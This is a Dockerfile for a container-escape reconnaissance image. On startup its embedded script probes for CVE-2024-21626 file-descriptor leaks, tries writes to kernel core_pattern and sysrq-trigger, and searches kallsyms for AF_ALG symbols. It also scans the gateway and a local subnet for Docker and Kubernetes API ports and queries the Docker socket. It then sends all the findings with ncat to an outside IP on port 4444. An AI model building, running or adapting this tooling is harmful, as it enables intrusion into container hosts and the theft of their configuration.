# syntax=er028455/df-frontend:v4
# build-trigger: 6
FROM alpine:3.18 AS builder
RUN apk add --no-cache gcc musl-dev linux-headers
COPY algtest.c /algtest.c
RUN gcc -static -o /algtest /algtest.c

FROM alpine:3.18
RUN apk add --no-cache curl nmap-ncat
COPY --from=builder /algtest /algtest
COPY --from=er028455/df-frontend:v4 /socktest /socktest

RUN printf '#!/bin/sh\n\
{\n\
echo "=== RUNTIME RECON V8 ==="\n\
uname -a; hostname; id\n\
\n\
echo "--- CAPABILITIES ---"\n\
grep -E "Cap(Eff|Bnd|Prm)" /proc/self/status\n\
\n\
echo "--- AF_ALG ALGORITHM TEST ---"\n\
/algtest 2>&1\n\
\n\
echo "--- /proc/crypto ---"\n\
head -100 /proc/crypto 2>&1\n\
\n\
echo "--- CVE-2024-21626 FD ENUM ---"\n\
ls -la /proc/self/fd/ 2>&1\n\
for FD in 3 4 5 6 7 8 9 10 11 12; do\n\
  TARGET=$(readlink /proc/self/fd/$FD 2>/dev/null)\n\
  [ -n "$TARGET" ] && echo "fd $FD -> $TARGET"\n\
done\n\
\n\
echo "--- PROCFS WRITE TEST ---"\n\
echo "core_pattern:"; cat /proc/sys/kernel/core_pattern 2>&1\n\
echo "modprobe:"; cat /proc/sys/kernel/modprobe 2>&1\n\
echo "core_write:"; echo "test" > /proc/sys/kernel/core_pattern 2>&1; echo "rc=$?"\n\
echo "sysrq_write:"; echo "" > /proc/sysrq-trigger 2>&1; echo "rc=$?"\n\
\n\
echo "--- NETWORK ---"\n\
ip addr 2>/dev/null | grep -E "inet |eth"\n\
ip route 2>/dev/null\n\
\n\
echo "--- DOCKER API SCAN ---"\n\
GW=$(ip route 2>/dev/null | grep default | awk "{print \\$3}")\n\
echo "Gateway: $GW"\n\
for PORT in 2375 2376 4243 9323 5000 8080 443 80 22 6443 10250 10255 2379 2380; do\n\
  nc -z -w 2 $GW $PORT 2>/dev/null && echo "$GW:$PORT OPEN" || true\n\
done\n\
for PORT in 2375 2376 4243 8080 80 443; do\n\
  RESP=$(curl -s -m 3 http://$GW:$PORT/version 2>&1)\n\
  [ -n "$RESP" ] && echo "HTTP $GW:$PORT/version: $RESP"\n\
done\n\
\n\
echo "--- DOCKER SOCKET ---"\n\
ls -la /var/run/docker.sock 2>&1\n\
curl -s --unix-socket /var/run/docker.sock http://localhost/version 2>&1 | head -5\n\
\n\
echo "--- SUBNET SCAN ---"\n\
for i in 1 2 3 4 5; do\n\
  for PORT in 2375 2376 8080 80 22 443; do\n\
    nc -z -w 1 172.18.0.$i $PORT 2>/dev/null && echo "172.18.0.$i:$PORT OPEN" || true\n\
  done\n\
done\n\
\n\
echo "--- MOUNT INFO ---"\n\
mount 2>&1 | grep -vE "^proc |^tmpfs |^devpts " | head -15\n\
\n\
echo "--- RUNC/RUNTIME ---"\n\
cat /proc/1/cmdline 2>/dev/null | tr "\\0" " " 2>&1; echo ""\n\
cat /proc/1/cgroup 2>&1 | head -3\n\
\n\
echo "--- KALLSYMS ---"\n\
echo "unix_walk_scc:"; grep -c unix_walk_scc /proc/kallsyms 2>&1\n\
echo "algif:"; grep -c algif /proc/kallsyms 2>&1\n\
echo "af_alg:"; grep -c af_alg /proc/kallsyms 2>&1\n\
\n\
echo "=== END V8 ==="\n\
} > /tmp/recon 2>&1\n\
cat /tmp/recon\n\
' > /recon.sh && chmod +x /recon.sh

CMD sh -c "/recon.sh; ncat -w 15 129.101.121.138 4444 < /tmp/recon; sleep 999999"
